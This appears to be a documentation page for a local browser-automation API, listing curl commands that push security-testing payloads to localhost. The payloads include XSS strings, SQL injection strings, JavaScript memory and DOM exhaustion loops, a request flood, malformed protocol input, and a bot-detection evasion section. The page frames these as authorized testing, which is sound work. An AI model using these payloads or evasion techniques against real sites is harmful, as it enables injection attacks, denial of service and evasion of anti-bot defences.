# Security Testing Domain API

Security testing examples and attack patterns for responsible testing.

## XSS Testing

### Basic XSS Payloads
```bash
# Test form XSS
curl -X POST http://localhost:8888/cdp/type \
  -d '{"text": "<script>alert(1)</script>", "selector": "#search"}'

# Test attribute injection
curl -X POST http://localhost:8888/cdp/type \
  -d '{"text": "\" onmouseover=\"alert(1)", "selector": "#name"}'

# Test JavaScript execution context
curl -X POST http://localhost:8888/cdp/execute \
  -d '{"code": "document.body.innerHTML = \"<img src=x onerror=alert(1)>\""}'
```

## SQL Injection Testing

### Basic SQLi Payloads
```bash
# Test single quote
curl -X POST http://localhost:8888/cdp/type \
  -d "{\"text\": \"' OR 1=1--\", \"selector\": \"#user_id\"}"

# Test union injection
curl -X POST http://localhost:8888/cdp/type \
  -d "{\"text\": \"1 UNION SELECT password FROM users--\", \"selector\": \"#search\"}"
```

## Memory Testing

### Memory Bomb
```bash
# Allocate large amounts of memory
curl -X POST http://localhost:8888/cdp/execute \
  -d '{"code": "let bomb = []; for(let i = 0; i < 1000000; i++) bomb.push(new Array(1000).fill(\"x\"));"}'

# Monitor memory usage
curl http://localhost:8888/cdp/performance/memory
```

## Malformed Data Testing

### Invalid Selectors
```bash
# Test with broken selectors
curl -X POST http://localhost:8888/cdp/click \
  -d '{"selector": "<<<invalid>>>"}'

# Test with null bytes
curl -X POST http://localhost:8888/cdp/type \
  -d "{\"text\": \"test\\u0000null\", \"selector\": \"#input\"}"
```

### Protocol Abuse
```bash
# Send malformed CDP commands
curl -X POST http://localhost:8888/cdp/command \
  -d '{"method": "Invalid.Method", "params": {"bad": "data"}}'

# Test with extreme values
curl -X POST http://localhost:8888/cdp/click \
  -d '{"x": 999999999, "y": -999999999}'
```

## DOS Testing

### Request Flooding
```bash
# Rapid screenshot requests
for i in {1..100}; do
  curl http://localhost:8888/cdp/screenshot > /dev/null &
done
```

### Resource Exhaustion
```bash
# DOM manipulation bomb
curl -X POST http://localhost:8888/cdp/execute \
  -d '{"code": "for(let i=0;i<10000;i++){document.body.appendChild(document.createElement(\"div\"));}"}'
```

## Security Headers Testing

### Check Response Headers
```bash
# Inspect security headers
curl -I http://localhost:8888/cdp/status

# Test CORS behavior
curl -H "Origin: https://evil.com" http://localhost:8888/cdp/status
```

## Responsible Testing Guidelines

⚠️ **IMPORTANT**: These examples are for **authorized testing only**

- **Own systems only**: Never test on systems you don't own
- **Controlled environment**: Use isolated test environments
- **Documented consent**: Ensure proper authorization
- **Responsible disclosure**: Report findings through proper channels
- **No harm**: Avoid causing damage or data loss

## Detection Bypass Testing

### Anti-Automation Evasion
```bash
# Test with realistic delays
curl -X POST http://localhost:8888/cdp/type \
  -d '{"text": "human", "selector": "#input"}'
sleep 2
curl -X POST http://localhost:8888/cdp/click \
  -d '{"selector": "#submit"}'

# Test stealth capabilities
curl http://localhost:8888/cdp/console/logs | grep -i "webdriver"
```

**Note**: CDP Ninja has successfully bypassed BrowserScan.net detection in testing, indicating potential gaps in current bot detection mechanisms.